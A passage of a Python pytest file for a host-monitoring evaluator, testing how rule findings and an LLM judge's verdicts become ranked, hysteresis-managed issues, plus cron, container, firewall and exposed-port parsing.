    issue = only_issue(collation, UNIT)
    assert issue.severity is WARN and "urgency" in issue.reasons


def hot(cpu_pct: float = 250.0) -> dict[str, Any]:
    return {"processes": processes(proc(4242, "python", cpu_pct=cpu_pct))}


PY = "process:4242"


@pytest.mark.asyncio
async def test_an_unstable_only_warn_opens_no_issue():
    e, _, _ = make(FakeJudge({PY: [("cpu_runaway", WARN, False), ("impact", CRITICAL, False),
                                   ("urgency", WATCH, None)]}))
    feed(e, hot(), T0)
    collation = await run(e, T0 + 1)
    assert PY + "|judged" not in issues_by(collation)
    assert any(a.entity == PY and a.severity is CRITICAL for a in collation.attestations)


@pytest.mark.asyncio
async def test_a_warn_that_is_not_all_unstable_opens_a_judged_issue():
    e, _, _ = make(FakeJudge({PY: [("cpu_runaway", WARN, None, {"cause": "cpu-runaway",
                                                                "next_step": "top -p 4242"}),
                                   ("impact", CRITICAL, False), ("urgency", WATCH, True),
                                   ("quiet", INFO, None)]}))
    feed(e, hot(), T0)
    issue = only_issue(await run(e, T0 + 1), PY, deterministic=False)
    assert (issue.state, issue.severity, issue.domain) == (OPEN, WARN, "processes")
    assert issue.reasons == ("cpu_runaway", "impact", "urgency")
    assert issue.next_step == "top -p 4242"
    assert issue.title == "CPU runaway: pid 4242"   # no evidence to name the program from
    assert issue.id == ev.issue_id("processes", PY, "process")



@pytest.mark.asyncio
async def test_a_judged_issue_is_titled_and_carries_the_evidence_it_was_judged_on():
    seen = {"process/args": "/usr/bin/python3 train.py --epochs 90", "process/cpu_pct": 250.0}
    e, _, _ = make(FakeJudge({PY: [("cpu_runaway", WARN, True, {"cause": "cpu-runaway",
                                                                "evidence": seen})]}))
    feed(e, hot(), T0)
    issue = only_issue(await run(e, T0 + 1), PY, deterministic=False)
    assert issue.title == "CPU runaway: python3 (pid 4242)"
    assert issue.evidence == seen and issue.why == ""
    assert issue.last_seen == issue.updated_at == T0 + 1


@pytest.mark.asyncio
async def test_a_domain_issue_is_titled_by_its_domain_and_a_process_record_names_it_too():
    assert ev._title("exposed-listener", "security", "domain:security", {}) == \
        "Exposed listener (security)"
    assert ev._title("", "processes", PY, {"process": {"comm": "java"}}) == \
        "Judged issue: java (pid 4242)"
    assert ev._title("odd", "logs", "log:kernel", {}) == "Odd: log:kernel"


@pytest.mark.asyncio
async def test_last_seen_stays_where_the_conditions_were_last_present():
    e, _, _ = make(FakeJudge({PY: [("cpu_runaway", WARN, True, {"cause": "cpu-runaway"})]}))
    feed(e, hot(), T0)
    first = only_issue(await run(e, T0 + 1), PY, deterministic=False)
    feed(e, {"processes": processes()}, T0 + 300)
    later = only_issue(await run(e, T0 + 301), PY, deterministic=False)
    assert later.state is OPEN and later.updated_at == T0 + 301
    assert later.last_seen == first.last_seen == T0 + 1


TMP_PID = "process:3320260"


@pytest.mark.asyncio
async def test_a_program_run_from_tmp_is_one_issue_about_that_process_rule_and_judge_together():
    row = proc(3320260, "main", cpu_pct=529.0, elapsed_s=0,
               args="/tmp/go-build1/b001/exe/main --serve")
    e, judge, _ = make(FakeJudge({TMP_PID: [("suspicious", CRITICAL, True,
                                              {"cause": "suspicious-process"})]}))
    feed(e, {"processes": processes(row, from_tmp=[row])}, T0)
    collation = await run(e, T0 + 1)
    assert TMP_PID in judge.last                  # the process is still asked about
    issue = only_issue(collation, TMP_PID)        # ...and its issue is the rule's, merged
    assert TMP_PID + "|judged" not in issues_by(collation)
    assert issue.domain == "processes" and issue.severity is CRITICAL
    assert issue.title == "A program is running from /tmp: /tmp/go-build1/b001/exe/main"
    assert issue.reasons == ("process.runs_from_tmp", "suspicious")
    assert issue.evidence["args"] == "/tmp/go-build1/b001/exe/main --serve"
    assert issue.evidence["seen_at"] == T0 and "swapped" in issue.why


@pytest.mark.asyncio
async def test_an_adopted_issue_keeps_its_evidence_and_why():
    stored = Issue("i-1", OPEN, WARN, "t", "processes", PY, T0, T0, True, ("r",), "step",
                   evidence={"pid": 4242}, why="because", last_seen=T0)
    assert ev._adopted(stored).evidence == {"pid": 4242}
    assert ev._adopted(stored).why == "because"


DB = "container:shopfront-db-1"


def sick(status: str = "Up 2 hours (unhealthy)") -> dict[str, Any]:
    return {"containers": containers(container("shopfront-db-1", health="unhealthy",
                                               status=status))}


@pytest.mark.asyncio
async def test_a_judged_issue_stands_while_its_context_is_current_but_not_re_asked():
    judge = FakeJudge({DB: [("unhealthy", WARN, True)]})
    e, _, _ = make(judge)
    feed(e, sick(), T0 - 300)
    feed(e, sick(), T0)
    first = only_issue(await run(e, T0 + 1), DB, deterministic=False)
    for n in range(ev.RESOLVE_AFTER + 1):
        feed(e, sick(), T0 + 300 * (n + 1))   # the same state: not re-asked
        collation = await run(e, T0 + 300 * (n + 1) + 1)
        assert not [a for a in collation.attestations if a.entity == DB]
        assert only_issue(collation, DB, deterministic=False).state is OPEN
    assert first.id == only_issue(collation, DB, deterministic=False).id


@pytest.mark.asyncio
async def test_judge_going_quiet_keeps_the_last_answers_rather_than_clearing():
    judge = FakeJudge({DB: [("unhealthy", WARN, True)]})
    e, _, _ = make(judge)
    feed(e, sick(), T0)
    await run(e, T0 + 1)
    judge.down = True
    for n in range(ev.RESOLVE_AFTER + 1):
        feed(e, sick(f"Up {n} hours (unhealthy)"), T0 + 300 * (n + 1))   # changed: asked
        collation = await run(e, T0 + 300 * (n + 1) + 1)
        assert DB in judge.last
        assert only_issue(collation, DB, deterministic=False).state is OPEN


@pytest.mark.asyncio
async def test_hysteresis_resolves_after_k_quiet_collations_then_reopens_the_same_id():
    e, first = await failed_unit(FakeJudge())
    id = only_issue(first, UNIT).id
    states = []
    for n in range(1, ev.RESOLVE_AFTER + 2):
        feed(e, {"units.failed": HEALTHY_UNITS}, T0 + 300 * n)
        collation = await run(e, T0 + 300 * n + 1)
        states.append({i.id: i.state for i in collation.issues}.get(id))
    assert states == [OPEN] * (ev.RESOLVE_AFTER - 1) + [RESOLVED, None]
    feed(e, {"units.failed": FAILED}, T0 + 9000)
    back = only_issue(await run(e, T0 + 9001), UNIT)
    assert (back.id, back.state, back.opened_at) == (id, OPEN, T0 + 9001)


@pytest.mark.asyncio
async def test_a_condition_that_returns_within_k_resets_the_count():
    e, _ = await failed_unit(FakeJudge())
    at = T0
    for units in [HEALTHY_UNITS] * (ev.RESOLVE_AFTER - 1) + [FAILED] + \
            [HEALTHY_UNITS] * (ev.RESOLVE_AFTER - 1):
        at += 300
        feed(e, {"units.failed": units}, at)
        collation = await run(e, at + 1)
        assert only_issue(collation, UNIT).state is OPEN


@pytest.mark.asyncio
async def test_a_judged_issue_resolves_k_collations_after_its_context_goes():
    e, _, _ = make(FakeJudge({PY: [("cpu_runaway", WARN, True)]}))
    feed(e, hot(), T0)
    id = only_issue(await run(e, T0 + 1), PY, deterministic=False).id
    states = []
    for n in range(1, ev.RESOLVE_AFTER + 1):
        feed(e, hot(cpu_pct=1.0), T0 + 300 * n)    # no longer hot: no context
        states.append({i.id: i.state for i in (await run(e, T0 + 300 * n + 1)).issues}[id])
    assert states == [OPEN] * (ev.RESOLVE_AFTER - 1) + [RESOLVED]


async def restarted(stored: Issue) -> Evaluator:
    """A fresh evaluator, as after a service restart, adopting what the store held."""
    e, _, _ = make()
    e.adopt([stored])
    return e


@pytest.mark.asyncio
async def test_an_adopted_issue_whose_condition_has_gone_resolves_once_under_its_id():
    _, first = await failed_unit(FakeJudge())
    stored = only_issue(first, UNIT)
    e = await restarted(stored)
    states = []
    for n in range(1, ev.RESOLVE_AFTER + 2):
        feed(e, {"units.failed": HEALTHY_UNITS}, T0 + 300 * n)
        states.append([i.state for i in (await run(e, T0 + 300 * n + 1)).issues
                       if i.id == stored.id])
    assert states == [[OPEN]] * (ev.RESOLVE_AFTER - 1) + [[RESOLVED], []]


@pytest.mark.asyncio
async def test_an_adopted_issue_whose_condition_holds_goes_on_under_its_id_and_opening():
    _, first = await failed_unit(FakeJudge())
    stored = only_issue(first, UNIT)
    e = await restarted(stored)
    feed(e, {"units.failed": FAILED}, T0 + 300)
    collation = await run(e, T0 + 301)
    [again] = [i for i in collation.issues if i.entity == UNIT]
    assert (again.id, again.state, again.opened_at, again.updated_at) == (
        stored.id, OPEN, T0 + 1, T0 + 301)
    assert (again.severity, again.title, again.reasons) == (
        stored.severity, stored.title, stored.reasons)


@pytest.mark.asyncio
async def test_a_held_issue_is_adopted_as_open_and_its_score_is_read_back():
    judge = FakeJudge({PY: [("cpu_runaway", WARN, True), ("impact", WATCH, False),
                            ("urgency", WATCH, True, {"answer": urgency(2.0)})]})
    e, _, _ = make(judge)
    feed(e, hot(), T0)
    judged = only_issue(await run(e, T0 + 1), PY, deterministic=False)
    assert judged.score == percolate(WARN, False, 0.5, unstable=True, novel=True)
    held = dataclasses.replace(judged, state=IssueState.ACKNOWLEDGED)
    gone = dataclasses.replace(issue("i-gone", 1.0), state=RESOLVED)
    e = await restarted(held)
    e.adopt([gone, dataclasses.replace(held, title="a second copy")])
    collation = await run(e, T0 + 2)   # nothing observed: the condition is absent
    assert "i-gone" not in {i.id for i in collation.issues}
    [kept] = [i for i in collation.issues if i.id == judged.id]
    assert kept == dataclasses.replace(judged, updated_at=T0 + 2)   # novelty holds, too
    later = T0 + 1 + ev.NOVELTY_S
    assert only_issue(await run(e, later), PY, deterministic=False).score == judged.score - 1


@pytest.mark.asyncio
async def test_when_the_finding_stops_a_warranted_judgement_becomes_its_own_issue():
    worker = "container:shopfront-worker-1"
    e, _, _ = make(FakeJudge({worker: [("crash_loop", WARN, True)]}))
    feed(e, {"containers": containers(container("shopfront-worker-1", "restarting",
                                                exit_code=1))}, T0)
    first = await run(e, T0 + 1)
    assert only_issue(first, worker).severity is WARN
    assert worker + "|judged" not in issues_by(first)
    # it stops restarting but stays unhealthy: no finding, the entity is still worth a look
    feed(e, {"containers": containers(container("shopfront-worker-1", health="unhealthy"))},
         T0 + 300)
    second = await run(e, T0 + 301)
    judged = only_issue(second, worker, deterministic=False)
    assert (judged.state, judged.severity, judged.reasons) == (OPEN, WARN, ("crash_loop",))
    assert judged.id == ev.issue_id("containers", worker, "container")
    assert only_issue(second, worker).state is OPEN     # the deterministic one, in hysteresis


@pytest.mark.asyncio
async def test_escalation_is_novel_and_a_standing_issue_is_not():
    judge = FakeJudge()
    e, first = await failed_unit(judge)
    novel = only_issue(first, UNIT).score
    at = T0 + ev.NOVELTY_S + 10
    feed(e, {"units.failed": FAILED}, at)
    standing = only_issue(await run(e, at + 1), UNIT)
    assert standing.score == novel - 1
    judge.script[UNIT] = [("urgency", CRITICAL, True)]
    failed = copy.deepcopy(FAILED)
    failed["units"][0]["sub"] = "dead"
    feed(e, {"units.failed": failed}, at + 300)
    raised = only_issue(await run(e, at + 301), UNIT)
    assert raised.severity is CRITICAL and raised.opened_at == T0 + 1
    assert raised.score == percolate(CRITICAL, True, 0.0, unstable=False, novel=True)


# --- ranking -------------------------------------------------------------------------------------


def test_percolation_orders_severity_then_deterministic_urgency_stability_novelty():
    ladder = [
        percolate(CRITICAL, False, 0.0, unstable=True, novel=False),
        percolate(WARN, True, 0.0, unstable=True, novel=False),
        percolate(WARN, False, 1.0, unstable=True, novel=False),
        percolate(WARN, False, 0.5, unstable=False, novel=True),
        percolate(WARN, False, 0.5, unstable=False, novel=False),
        percolate(WARN, False, 0.5, unstable=True, novel=True),
        percolate(WARN, False, 0.49, unstable=False, novel=True),
        percolate(WATCH, True, 1.0, unstable=False, novel=True),
        percolate(INFO, True, 1.0, unstable=False, novel=True),
    ]
    assert ladder == sorted(ladder, reverse=True) and len(set(ladder)) == len(ladder)


def issue(id: str, score: float, severity: Severity = WARN) -> Issue:
    return Issue(id=id, state=OPEN, severity=severity, title=id, domain="d", entity="e",
                 opened_at=T0, updated_at=T0, deterministic=False, reasons=(), next_step="",
                 score=score)


def test_urgency_is_read_only_from_a_score_answer_on_the_banks_scale():
    context = Context("unit-x", "unit", "services", UNIT, {})
    scored = attestation(context, "urgency", WARN, True, answer=urgency(2.0))
    noul = attestation(context, "urgency", WARN, True)
    odd = dataclasses.replace(scored, answer={**urgency(2.0), "expected": "high"})
    elsewhere = dataclasses.replace(scored, question="impact")
    unstable = dataclasses.replace(attestation(context, "urgency", WARN, False,
                                               answer=urgency(4.0)))
    assert ev._urgency([scored]) == 0.5
    assert ev._urgency([noul, odd, elsewhere, unstable]) == 0.0


def test_rank_sorts_by_score_then_id():
    got = rank([issue("b", 1.0), issue("c", 5.0), issue("a", 1.0)])
    assert [i.id for i in got] == ["c", "a", "b"]
    assert rank([]) == ()


@pytest.mark.asyncio
async def test_collation_issues_come_out_ranked_with_urgency_and_stability_counted():
    judge = FakeJudge({
        UNIT: [("urgency", WARN, True, {"answer": urgency(3.0)})],
        PY: [("cpu_runaway", WARN, True), ("urgency", WATCH, True, {"answer": urgency(1.9)})],
        "process:7": [("cpu_runaway", WARN, True), ("stuck", WARN, False),
                      ("urgency", WATCH, True, {"answer": urgency(1.9)})],
        "process:8": [("cpu_runaway", WARN, True), ("urgency", WATCH, True,
                                                    {"answer": urgency(2.2)})],
        "process:9": [("impact", CRITICAL, True)],
    })
    e, _, _ = make(judge)
    rows = [proc(pid, f"p{pid}", cpu_pct=200.0) for pid in (7, 8, 9, 4242)]
    feed(e, {"units.failed": FAILED, "processes": processes(*rows)}, T0)
    collation = await run(e, T0 + 1)
    assert [i.entity for i in collation.issues if not i.entity.startswith("probe:")] == [
        "process:9", UNIT, "process:8", PY, "process:7"]
    assert collation.issues == rank(collation.issues)
    unit = only_issue(collation, UNIT)
    assert unit.score == percolate(WARN, True, 0.75, unstable=False, novel=True)


# --- the operator's case, end to end -------------------------------------------------------------


@pytest.mark.asyncio
async def test_the_operators_lock_end_to_end():
    judge = FakeJudge({"container:shopfront-worker-1": [
        ("crash_loop", WARN, True, {"next_step": "docker logs --tail 200 shopfront-worker-1"}),
        ("urgency", WARN, True, {"answer": urgency(2.9)})]})
    correlator = FakeCorrelator(related=True)
    e, _, _ = make(judge, correlator)
    before = host()
    before["net.dev"] = netdev("lo", "enp5s0", "docker0", "veth9b0e441")
    feed(e, before, T0)
    now = operator_host()
    now["net.dev"] = netdev("lo", "enp5s0", "docker0", "veth3a1f2c9")
    feed(e, now, T0 + 60)
    collation = await run(e, T0 + 61)

    rules_fired = {(f.rule, f.entity) for f in collation.findings}
    assert {("container.crash_loop", "container:shopfront-worker-1"),
            ("net.interface_churn", "net:interfaces"),
            ("journal.flood", "unit:openvpn.service"),
            ("unit.failed", "unit:casper-md5check.service")} <= rules_fired

    worker = only_issue(collation, "container:shopfront-worker-1")
    assert (worker.severity, worker.deterministic, worker.domain) == (WARN, True, "containers")
    assert worker.reasons == ("container.crash_loop", "crash_loop", "urgency")
    assert worker.next_step == "docker logs --tail 200 shopfront-worker-1"
    churn = only_issue(collation, "net:interfaces")
    flood = only_issue(collation, "unit:openvpn.service")
    assert (churn.domain, flood.domain) == ("network", "logs")

    handed = [c for call in correlator.calls for c in call]
    crash = [c for c in handed if c.basis == "template:crash-loop"]
    assert len(crash) == 1
    assert {m.id for m in crash[0].members} == {f"issue:{i.id}" for i in (worker, churn, flood)}
    assert all(m.kind == "issue" for c in handed for m in c.members)   # no issue beside its own
    assert len(handed) <= ev.CORRELATION_LIMIT
    link = next(link for link in collation.links if link.basis == "template:crash-loop")
    assert set(link.members) == {m.id for m in crash[0].members}

    subjects = [event.subject for event in collation.events]
    assert f"link.{link.id}" in subjects
    assert f"issue.{worker.id}" in subjects
    assert "finding.container.crash_loop" in subjects
    assert any(s.startswith("attest.container-") for s in subjects)
    for event in collation.events:
        assert event.source == "evaluator" and event.at == T0 + 61
        assert decode_event(encode_event(event)) == event
    kinds = {event.kind for event in collation.events}
    assert kinds == {Kind.FINDING, Kind.ATTESTATION, Kind.ISSUE, Kind.LINK}
    assert len(collation.events) == (len(collation.findings) + len(collation.attestations)
                                     + len(collation.issues) + len(collation.links))
    asked = judge.calls[-1]
    assert collation.questions_asked == sum(ev.asks(c) for c in asked) \
        + len(handed) * len(bank_for(ContextKind.CORRELATION))
    assert sum(ev.cost(ContextKind(c.kind)) for c in asked) <= ev.CONTEXT_BUDGET
    touched = {"container:shopfront-worker-1", "unit:openvpn.service",
               "unit:casper-md5check.service", "domain:containers", "domain:network",
               "domain:logs", "domain:services"}
    assert touched <= {c.entity for c in asked}
    assert collation.duration_ms >= 0


def test_correlation_items_are_open_issues_plus_findings_no_issue_carries():
    carried = Finding("unit.failed", WARN, "Unit x has failed", UNIT)
    loose = Finding("disk.fill", WARN, "Filesystem / is 95% full", "mount:/")
    standing = dataclasses.replace(issue("i-1", 9.0), entity=UNIT, reasons=("unit.failed",))
    gone = dataclasses.replace(issue("i-2", 1.0), state=RESOLVED)
    items = ev.correlation_items(T0, (carried, loose), (standing, gone))
    assert [i.id for i in items] == ["issue:i-1", "finding:disk.fill@mount:/"]


def test_nothing_observed_means_no_contexts_and_a_collation_says_the_agent_is_gone():
    e, _, _ = make()
    assert e.contexts(T0) == ()
    assert e.deferred(T0) == 0


@pytest.mark.asyncio
async def test_an_empty_collation_still_reports_the_missing_agent():
    e, judge, correlator = make(started=T0)
    collation = await run(e, T0)
    assert judge.calls == [] and correlator.calls == []
    assert [f.rule for f in collation.findings] == ["agent.stopped"]
    assert only_issue(collation, "agent:collector").severity is CRITICAL


def test_dataclass_is_frozen():
    c = Collation((), (), (), (), (), 0, 0, 0)
    with pytest.raises(dataclasses.FrozenInstanceError):
        c.deferred_contexts = 1  # type: ignore[misc]


# --- the seam between the agent's parsers and `jobs` ---------------------------------------------

def test_real_parser_output_joins_into_jobs_and_services():
    """`jobs_test` cannot import `probes` (it sits below it), so its fixtures are copies of parser
    output. This runs the real parsers over raw probe bytes and hands their output to `jobs`, as
    the evaluator and the dashboard do, so a renamed parser field fails here."""
    from neonwatch.probes import parsers

    raw = {
        "cron.system": b"SHELL=/bin/sh\n17 * * * * root run-parts --report /etc/cron.hourly\n",
        "cron.d": parsers.frame_files(
            {"/etc/cron.d/sysstat": b"5-55/10 * * * * root debian-sa1 1 1\n"}),
        "cron.user": parsers.frame_files(
            {"/var/spool/cron/crontabs/alice": b"@reboot /home/alice/sync.sh\n"}),
        "cron.daily": parsers.frame_files(
            {"/etc/cron.daily/logrotate": b"#!/bin/sh\nlogrotate /etc/logrotate.conf\n"}),
        "cron.daily.names": parsers.frame_listing(
            ["logrotate", "google-chrome", "dpkg.bak"],
            {"google-chrome": "/opt/google/chrome/cron/google-chrome"}),
        "units.timers": json.dumps([{"next": 1791849600000000, "left": 0, "last": 1791809445968694,
                                     "passed": 0, "unit": "apt-daily.timer",
                                     "activates": "apt-daily.service"}]).encode(),
        "units.detail": (
            b"Unit=apt-daily.service\n"
            b"TimersCalendar={ OnCalendar=*-*-* 06,18:00:00 ; next_elapse=@1791849600 }\n"
            b"TimersMonotonic=\nResult=success\nId=apt-daily.timer\nTriggers=apt-daily.service\n"
            b"TriggeredBy=\nDescription=Daily apt download activities\nActiveState=active\n"
            b"SubState=waiting\nFragmentPath=/usr/lib/systemd/system/apt-daily.timer\n"
            b"UnitFileState=enabled\n\n"
            b"Result=exit-code\nNRestarts=4\nExecMainStartTimestamp=@1791809446\n"
            b"ExecMainExitTimestamp=@1791809450\nExecMainStatus=1\n"
            b"ExecStart={ path=/usr/lib/apt/apt.systemd.daily ;"
            b" argv[]=/usr/lib/apt/apt.systemd.daily update ; ignore_errors=no ;"
            b" start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }\n"
            b"User=\nId=apt-daily.service\nTriggers=\nTriggeredBy=apt-daily.timer\n"
            b"Description=Daily apt download activities\nActiveState=inactive\nSubState=dead\n"
            b"FragmentPath=/usr/lib/systemd/system/apt-daily.service\nUnitFileState=static\n"),
    }
    latest = {probe: parsers.parse(probe, body) for probe, body in raw.items()}
    assert set(latest) <= jobs.PROBES

    found, skipped = jobs.scheduled(latest)
    assert skipped == 0
    by_file = {(job["source"], job["file"]): job for job in found}

    sysstat = by_file[("cron", "/etc/cron.d/sysstat")]
    assert (sysstat["user"], sysstat["schedule"], sysstat["command"]) == (
        "root", "5-55/10 * * * *", "debian-sa1 1 1")
    alice = by_file[("cron", "/var/spool/cron/crontabs/alice")]
    assert (alice["user"], alice["schedule"]) == ("alice", "@reboot")

    timer = next(job for job in found if job["id"] == "timer:apt-daily.timer")
    assert timer["unit"] == "apt-daily.service"
    assert "/usr/lib/apt/apt.systemd.daily update" in timer["command"]
    assert timer["result"] == "exit-code"
    assert timer["last"] == pytest.approx(1791809445.968694)
    assert timer["next"] == pytest.approx(1791849600.0)
    assert "*-*-* 06,18:00:00" in timer["schedule"]

    chrome = next(job for job in found if job["id"] == "cron:/etc/cron.daily/google-chrome")
    assert chrome["unread"] and chrome["command"] == ""
    # where the link points is in what the judge is asked about (2026-10-27: read as disguised)
    assert chrome["static"]["target"] == "/opt/google/chrome/cron/google-chrome"
    assert next(job for job in found
                if job["id"] == "cron:/etc/cron.daily/dpkg.bak")["skipped_by_run_parts"]
    assert not next(job for job in found
                    if job["id"] == "cron:/etc/cron.daily/logrotate")["unread"]
    for job in found:  # what the judge sees never carries run state, so it is due only on change
        assert not {"last", "next", "result", "id"} & set(job["static"])

    service = next(s for s in jobs.services(latest) if s["name"] == "apt-daily.service")
    assert (service["active"], service["result"], service["restarts"]) == (
        "inactive", "exit-code", 4)


@pytest.mark.parametrize(("status", "seconds"), [
    ("Exited (0) 5 weeks ago", 5 * 604_800), ("Exited (137) 21 hours ago", 21 * 3600),
    ("Up 3 seconds", 3), ("Up Less than a second", 0), ("Up About a minute (healthy)", 60),
    ("Up About an hour", 3600), ("Restarting (1) 2 minutes ago", 120), ("Created", None),
    ("", None), (None, None)])
def test_a_status_age_is_read_from_dockers_wording(status, seconds):
    assert ev._status_age_s(status) == seconds


def _churn_of(e: ev.Evaluator, now: float) -> dict:
    domain = {c.entity: c for c in e.contexts(now)}["domain:containers"]
    return domain.state["containers"]["churn"]


def test_old_exits_are_history_and_only_recent_ones_are_churn():
    """imagegen's exit 137 from 21 hours before, with nothing restarting, was judged `oom` churn
    (2026-10-27): the state now counts churn itself."""
    e, _, _ = make()
    data = host()
    data["containers"] = containers(
        container("imagegen", "exited", exit_code=137, status="Exited (137) 21 hours ago"),
        container("shopfront-migrate-1", "exited", exit_code=0, status="Exited (0) 5 weeks ago"),
        container("api-1", status="Up 20 hours (healthy)"))
    feed(e, data, T0)
    churn = _churn_of(e, T0 + 1)
    assert churn == {"restarting": 0, "exited_last_hour": 0, "started_last_hour": 0, "names": []}

    data["containers"] = containers(
        container("worker-1", "restarting", exit_code=1, status="Restarting (1) 3 seconds ago"),
        container("job-1", "exited", exit_code=2, status="Exited (2) 10 minutes ago"),
        container("api-1", status="Up 4 minutes (healthy)"),
        container("imagegen", "exited", exit_code=137, status="Exited (137) 21 hours ago"))
    feed(e, data, T0 + 60)
    churn = _churn_of(e, T0 + 61)
    assert churn == {"restarting": 1, "exited_last_hour": 1, "started_last_hour": 1,
                     "names": ["worker-1", "job-1"]}



def test_a_name_run_parts_skips_is_listed_but_not_judged_as_a_job():
    """/etc/cron.hourly/.placeholder (the cron package's keep-the-directory file) was asked about
    as root-writable-exec (2026-10-27); run-parts never runs a dot name."""
    e, _, _ = make()
    data = host()
    data["cron.hourly.names"] = {"count": 1, "entries": [".placeholder"], "links": {}}
    feed(e, data, T0)
    listed = jobs.scheduled({p: v for p, v in data.items() if p in jobs.PROBES})[0]
    skipped = [j for j in listed if j["skipped_by_run_parts"]]
    assert [j["file"] for j in skipped] == ["/etc/cron.hourly/.placeholder"]
    judged = {c.entity for c in e.contexts(T0 + 1) if c.kind == "job"}
    assert f"job:{skipped[0]['id']}" not in judged
    assert judged == {f"job:{j['id']}" for j in listed if not j["skipped_by_run_parts"]}


# --- evidence ------------------------------------------------------------------------------------


def evidenced_host() -> dict[str, dict[str, Any]]:
    """`operator_host` a sample after `host`, changed so every question has something to read:
    counters that moved, an interface, mount, module, unit file and timer that came or went, a
    port published and newly listening, a SATA disk, and the failed unit's service record."""
    data = operator_host()
    data["cpu.stat"] = {**data["cpu.stat"], "user": 130_000, "system": 25_000, "idle": 960_000,
                        "iowait": 1500, "softirq": 600, "ctxt": 1_200_000, "processes": 50_400}
    errs = {**iface("enp5s0", 9000), "rx_errs": 4}
    data["net.dev"] = {"interfaces": [iface("lo"), errs, iface("docker0"), iface("veth1a2b")],
                       "count": 4}
    data["mounts"] = {"mounts": [*data["mounts"]["mounts"], {
        "source": "nas:/volume1/models", "target": "/mnt/models", "fstype": "nfs4",
        "read_only": True, "network": True}], "count": 2}
    data["kernel.modules"] = {**data["kernel.modules"],
                              "modules": [*data["kernel.modules"]["modules"], "wireguard"]}
    data["units.files"] = {"units": {"ssh.service": "enabled", "backup.timer": "enabled"},
                           "count": 2, "by_state": {"enabled": 2}}
    data["units.timers"] = {**data["units.timers"], "timers": [
        *data["units.timers"]["timers"],
        {"unit": "backup.timer", "activates": "backup.service", "next": T0 + 7200, "last": None}]}
    data["units.detail"] = detail(
        *timed("apt-daily", APT), *timed("backup", "/usr/local/bin/backup"), sshd(),
        unit("casper-md5check.service", exec=["/usr/lib/casper/casper-md5check"],
             active="failed", sub="failed", result="exit-code", restarts=4, main_status=1,
             enabled="enabled", file="/usr/lib/systemd/system/casper-md5check.service"))
    data["containers"] = containers(
        container("shopfront-web-1", published=[port(3000)]),
        container("shopfront-worker-1", "restarting", exit_code=1,
                  status="Restarting (1) 12 seconds ago"),
        container("shopfront-db-1", health="unhealthy", status="Up 2 hours (unhealthy)",
                  network_mode="host", host_mounts=["/var/run/docker.sock"]))
    data["listeners"] = listeners(*data["listeners"]["listeners"],
                                  listener("tcp", "0.0.0.0", 3000, "docker-proxy", 800,
                                           wildcard=True))
    data["block.devices"] = {"entries": ["loop0", "nvme0n1", "sda"], "count": 3}
    data["smart.sda"] = smart("sda", type="sat", protocol="ATA", udma_crc_errors=0,
                              critical_warning=None, available_spare_pct=None,
                              percentage_used=None, media_errors=None, error_log_entries=None)
    return data


def evidenced() -> dict[ContextKind, Context]:
    e, _, _ = make()
    feed(e, host(), T0)
    feed(e, evidenced_host(), T0 + 300)
    return {ContextKind(c.kind): c for c in e.contexts(T0 + 301)}


def test_every_question_names_evidence_a_context_of_its_kind_carries():
    # A question asked of a state that cannot answer it is answered by guesswork: a writable
    # PATH, pending updates, log lines from a container whose state had none (2026-10-28). Each
    # names where its evidence lives, and here every one of those paths resolves in contexts
    # built from real-shaped observations, so a need that names nothing the evaluator writes
    # fails here rather than leaving its question silently never asked.
    built = evidenced()
    assert set(built) >= set(DOMAINS) | set(ENTITIES)
    for kind, context in built.items():
        for question in bank_for(kind):
            assert needs_present(question, context.state), (
                f"{kind.value}.{question.id} needs {question.needs}")


@pytest.mark.parametrize("kind", DOMAINS, ids=lambda k: k.value)
def test_every_domain_question_but_the_three_overall_ones_says_where_its_evidence_is(kind):
    for question in bank_for(kind):
        if question.id not in ("action", "urgency", "abnormality"):
            assert question.needs, f"{kind.value}.{question.id} declares no evidence"


def test_a_change_question_waits_for_a_previous_sample():
    # Without a previous sample there is no diff, and module_new was answered "yes" anyway.
    e, _, _ = make()
    feed(e, host(), T0)
    kernel = {c.id: c for c in e.contexts(T0 + 1)}["kernel"]
    module_new = next(q for q in bank_for(ContextKind.KERNEL) if q.id == "module_new")
    assert not needs_present(module_new, kernel.state)
    assert needs_present(module_new, evidenced()[ContextKind.KERNEL].state)


def test_the_firewall_states_whether_anything_filters_inbound_traffic():
    data = host()
    nat_only = [{"family": f, "table": t, "name": n, "hook": h, "type": ty, "policy": pol,
                 "priority": 0, "rules": r}
                for f, t, n, h, ty, pol, r in (("ip", "nat", "PREROUTING", "prerouting", "nat",
                                                "accept", 1),
                                               ("ip", "filter", "FORWARD", "forward", "filter",
                                                "drop", 2))]
    data["firewall"] = {**data["firewall"], "base_chains": nat_only}
    e, _, _ = make()
    feed(e, data, T0)
    state = {c.id: c for c in e.contexts(T0 + 1)}["firewall"].state["firewall"]
    assert state["input_chains"] == [] and state["inbound_filtered"] is False
    open_input = {"family": "inet", "table": "t", "name": "in", "hook": "input",
                  "type": "filter", "policy": "accept", "priority": 0, "rules": 0}
    assert ev._filtered({"base_chains": [open_input]}) is False
    assert ev._filtered({"base_chains": [{**open_input, "rules": 3}]}) is True
    host_state = {c.id: c for c in evidenced().values()}["firewall"].state["firewall"]
    assert host_state["inbound_filtered"] is True and host_state["input_chains"] == [
        {"family": "inet", "table": "filter", "policy": "drop", "rules": 8}]


def test_security_sees_every_wildcard_port_not_only_new_ones():
    # Without this, a database on 0.0.0.0 with no input filtering would go unremarked: the
    # exposure questions would be asked of a security state with no listeners in it.
    data = host()
    data["listeners"] = listeners(
        listener("tcp", "0.0.0.0", 6379, "docker-proxy", 700, wildcard=True),
        listener("tcp", "::", 6379, "docker-proxy", 701, wildcard=True),
        listener("tcp", "0.0.0.0", 5432, "docker-proxy", 702, wildcard=True),
        listener("udp", "0.0.0.0", 40000, "chrome", 703, wildcard=True),   # ephemeral: not one
        listener("tcp", "127.0.0.1", 8200, "judge", 4000))
    data["containers"] = containers(
        container("sideproject-redis-1", published=[port(6379), port(6379, "::")]),
        container("stopped-redis", "exited", published=[port(6379)]),     # not running
        container("loopback-db", published=[port(5432, "127.0.0.1")]))    # not on every address
    data["firewall"] = {**data["firewall"], "base_chains": []}
    e, _, _ = make()
    feed(e, data, T0)
    feed(e, data, T0 + 300)    # standing, not new: the listener rule says nothing now
    exposure = {c.id: c for c in e.contexts(T0 + 301)}["security"].state["exposure"]
    assert exposure == {"wildcard_ports": 2, "inbound_filtered": False, "listening": [
        {"proto": "tcp", "port": 5432, "processes": ["docker-proxy"]},
